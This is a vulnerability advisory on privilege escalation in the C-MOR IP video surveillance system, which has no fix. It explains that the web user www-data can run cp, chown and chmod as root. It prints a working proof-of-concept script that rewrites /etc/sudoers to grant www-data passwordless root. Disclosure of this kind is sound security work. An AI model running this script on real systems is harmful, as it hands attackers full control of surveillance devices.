~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Due to improper privilege management concerning sudo privileges, C-MOR
is vulnerable to a privilege escalation attack.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR system with shell access (see SYSS-2024-026[3]),
it was found that the Linux user "www-data" running the C-MOR web
interface can execute some OS commands as root via sudo without having
to enter the root password.

These commands, for example, include "cp", "chown", and "chmod", which
enable an attacker to modify the system's sudoer file in order to
execute all commands with root privileges.

Thus, it is possible to escalate the limited privileges of the user
"www-data" to root privileges.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

For demonstrating a privilege escalation attack with shell access as
the user "www-data", the following shell script was uploaded to the
C-MOR system and executed:

$ cat privesc.sh
sudo cp /etc/sudoers /home/cam
sudo chown www-data /home/cam/sudoers
sudo chmod 777 /home/cam/sudoers
echo 'www-data        ALL = (ALL) NOPASSWD: ALL' >> /home/cam/sudoers
sudo chmod 440 /home/cam/sudoers
sudo chown root /home/cam/sudoers
sudo cp /home/cam/sudoers /etc/sudoers
sudo rm /home/cam/sudoers

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

There is no fix for this security issue.
